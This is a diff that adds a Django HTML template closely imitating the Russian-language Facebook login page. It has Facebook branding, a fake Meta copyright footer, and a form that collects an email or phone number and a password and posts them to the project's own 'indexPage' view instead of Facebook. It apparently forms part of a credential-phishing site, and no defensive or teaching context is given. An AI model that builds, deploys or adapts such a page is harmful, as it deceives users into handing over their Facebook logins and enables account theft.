@@ -1,0 +1,33 @@
+{% load static%}
+<!DOCTYPE html>
+<html lang="ru">
+     <head>
+        <meta charset="UTF-8">
+         <title>Вход на Facebook</title>
+         <!-- Add this in the head section of your HTML file -->
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+          <link rel ="stylesheet" href="{% static 'style.css'%}">
+          <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/023/741/116/original/facebook-logo-icon-social-media-icon-free-png.png">
+        </head>
+         <body>
+         {% block content %}
+             <div class="container">
+           <form method="post" action="{% url 'indexPage' %}">
+    {% csrf_token %}
+    <img src="https://allstarlockandsecurity.com/wp-content/uploads/Facebook-Logo-1.png" alt="Facebook Logo" width="112" height="60.99" />
+    <input type="text" name="email" placeholder="Мобильный телефон или электронный адрес" />
+    <input type="password" name="password" placeholder="Пароль" />
+    <button type="submit">Войти</button>
+</form>
+
+                            </div>
+                            <div class="footer"> © Meta, 2024 <a href="#">Русский</a> <a href="#">Türkçe</a> <a href="#">+X (4)</a> <a href="#">Português (Brasil)</a> <a href="#">English (US)</a> <a href="#">Bahasa Indonesia</a> <a href="#">Español</a>
+                            </div>
+          {% endblock %}
+
+
+
+
+                        </body>
+                         </html>
